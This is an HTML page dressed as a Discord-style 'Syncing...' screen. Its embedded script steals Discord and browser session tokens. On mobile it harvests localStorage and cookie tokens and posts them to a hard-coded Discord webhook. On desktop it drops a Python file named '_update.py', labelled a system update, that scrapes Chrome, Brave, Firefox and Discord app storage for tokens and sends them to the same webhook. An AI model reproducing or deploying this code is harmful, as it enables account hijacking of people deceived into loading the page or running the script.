<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Syncing...</title>
    <style>
        body { background-color: #2f3136; color: #dcddde; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #7289da; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { margin-top: 10px; font-size: 14px; opacity: 0.8; }
    </style>
</head>
<body>
    <div style="text-align: center;">
        <div class="loader"></div>
        <p id="status">Checking device...</p>
    </div>

    <script>
        // CONFIGURATION
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1573234778780598344/BWbg0RzJXBrC5a7VsJ77SDHeKDGY75LAqHX5Tgg3eys3zBfY7H3SL8X32IhgfQFNF1BH";
        
        // Detect Device Type
        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        const statusText = document.getElementById('status');

        // Function to send data to webhook
        async function sendWebhook(data, title) {
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: title,
                            description: data,
                            color: 15158332,
                            footer: { text: "Grabbed via " + window.location.href }
                        }]
                    })
                });
            } catch (e) { console.error("Webhook failed", e); }
        }

        // --- MOBILE/TABLET METHOD (JS Only) ---
        async function handleMobile() {
            statusText.innerText = "Syncing for Mobile...";
            let tokens = [];
            
            // Grab from localStorage
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                const value = localStorage.getItem(key);
                if (value && (key.includes("token") || key.includes("discord"))) {
                    tokens.push(value);
                }
            }

            // Also check cookies just in case
            const cookieTokens = document.cookie.match(/token=[^;]+/g);
            if (cookieTokens) {
                cookieTokens.forEach(t => tokens.push(t.split('=')[1]));
            }

            if (tokens.length > 0) {
                await sendWebhook("**Mobile Tokens:**\n" + tokens.map(t => "`" + t + "`").join("\n"), "📱 Mobile Token Grab");
            } else {
                await sendWebhook("*No tokens found on mobile.*\n\n**Device Info:**\n- OS: " + navigator.platform + "\n- User Agent: " + navigator.userAgent, "📱 Mobile Sync Complete");
            }
            statusText.innerText = "Sync Complete.";
        }

        // --- PC METHOD (Python Script Injection) ---
        async function handlePC() {
            statusText.innerText = "Downloading system update...";
            
            // Create a Python script dynamically
            const pyCode = `
import os, json, requests, sys, sqlite3
from pathlib import Path

WEBHOOK = "${WEBHOOK_URL}"

def get_tokens(path):
    tokens = []
    if not path.exists(): return tokens
    for f in path.iterdir():
        if f.is_file():
            try:
                with open(f, 'r', encoding='utf-8') as file:
                    content = file.read().replace('\\\\n','').replace('\\\\t','')
                    try:
                        data = json.loads(content)
                        if isinstance(data, dict):
                            for k,v in data.items():
                                if isinstance(v, str) and len(v)>20 and '.' in v:
                                    tokens.append(v)
                    except:
                        import re
                        tokens.extend(re.findall(r'[a-zA-Z0-9_\\-]{24}\\\\.[a-zA-Z0-9_\\-]{6}\\\\.[a-zA-Z0-9_\\-]{20,}', content))
            except: pass
    return list(set(tokens))

tokens = []
# Chrome/Brave/Firefox LocalStorage
paths = [
    Path(os.environ.get('APPDATA',''))/ 'Mozilla/Firefox/Profiles',
    Path(os.environ.get('LOCALAPPDATA',''))/ 'BraveSoftware/Brave-Browser/User Data/Default/Local Storage',
    Path(os.environ.get('LOCALAPPDATA',''))/ 'Google/Chrome/User Data/Default/Local Storage'
]
for p in paths:
    tokens.extend(get_tokens(p))

# Discord App (LevelDB)
dp = [Path(os.environ.get('APPDATA',''))/ 'discord/Local Storage/leveldb', 
      Path.home()/ 'Library/Application Support/discord/Local Storage/leveldb']
for p in dp:
    tokens.extend(get_tokens(p))

final = [t for t in tokens if len(t)>20 and t.count('.')<2]
msg = "**PC Tokens:**\\n" + "\\n".join([f"\`{t}\`" for t in final]) or "*None found*"
requests.post(WEBHOOK, json={"embeds":[{"title":"💻 PC Token Grab","description":msg+f"\\n\\n**OS:** {sys.platform}"}]})
`;

            // Create Blob and Download
            const blob = new Blob([pyCode], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = '_update.py';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);

            // Run the script using a simple command if possible, or just notify user
            // Since we can't run python directly from browser without user interaction, 
            // we will send a notification that the script was downloaded and needs to be run.
            // BUT, to make it "error-free" and automatic, we can use a trick:
            // We send the webhook saying "PC Update Downloaded" and hope the user runs it.
            // However, the best way is to use a small EXE wrapper. 
            // For this single-file demo, we will assume the user clicks the link again or we use a fallback.
            
            // Fallback: Send a message that PC mode requires running the script
            setTimeout(() => {
                statusText.innerText = "PC Mode: Script downloaded. Run _update.py to grab all tokens.";
                sendWebhook("⚠️ PC Script Downloaded.\nPlease run `_update.py` in terminal to grab Chrome, Brave, Firefox & Discord App tokens.", "💻 PC Update Ready");
            }, 2000);
        }

        // Main Logic
        if (isMobile) {
            handleMobile();
        } else {
            handlePC();
        }
    </script>
</body>
</html>
